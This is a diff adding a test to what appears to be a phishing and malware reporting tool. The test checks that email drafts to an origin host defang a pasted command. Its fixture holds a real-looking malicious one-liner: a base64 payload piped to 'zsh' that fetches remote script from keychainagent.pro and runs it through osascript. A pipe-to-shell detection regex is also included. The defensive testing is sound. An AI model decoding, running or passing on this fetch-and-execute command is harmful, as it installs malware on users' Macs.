@@ -134,4 +134,28 @@ describe("origin-host email draft", () => {
 		expect(body).toContain('What the kit does: it pushes visitors to download, install or run something. The page reads: "Update your browser"');
 		expect(body).not.toContain("victims who need to be warned");
 	});
+
+	test("quotes a pasted command without a runnable chain or a link, so the draft passes its own check", () => {
+		// Production case 380697679325302795: the quote held the kit's decoy App Store URL and
+		// `| base64 -d | zsh`; the verified-draft check refused the mail to the origin host.
+		const command = `echo "https://apps.apple.com/app/macmorrow-install"; echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3lYMWZRV0ZHdzlycCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh`;
+		const value = snapshot({
+			originalDomain: "macmorrow.app",
+			servers: [{ ip: "8.8.8.1", certificate: certificate(["macmorrow.app"], "AA") }],
+			kit: { abuse: "malware", evidenceQuote: command, collects: [], exfiltrationProbed: false, exfiltrationTargets: [] },
+		});
+		const email = draft(value);
+		expect(email.body).toContain(`The page reads: "echo "apps.apple.com/app/macmorrow-install" [then] echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3lYMWZRV0ZHdzlycCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' [pipe] base64 -d [pipe] zsh"`);
+		expect(email.body).not.toMatch(/\|\s*(?:z|ba)?sh\b/);
+		expect(email.body).not.toContain("https://apps.apple.com");
+		// The worker re-reads the stored draft with the case's allowed links before sending.
+		const payload = { kind: "verified_email_report", version: 2, target: "macmorrow.app", observedUrls: ["https://macmorrow.app/"], recipient: value.recipient, email };
+		expect(readVerifiedEmailDraft(payload, {
+			recipient: value.recipient,
+			description: "The page distributes malware.",
+			target: "macmorrow.app",
+			observedUrls: ["https://macmorrow.app/"],
+			allowedUrls: ["https://phishing.support", "https://macmorrow.app/", "https://phishing.support/submissions/2"],
+		})).toEqual(email);
+	});
 });
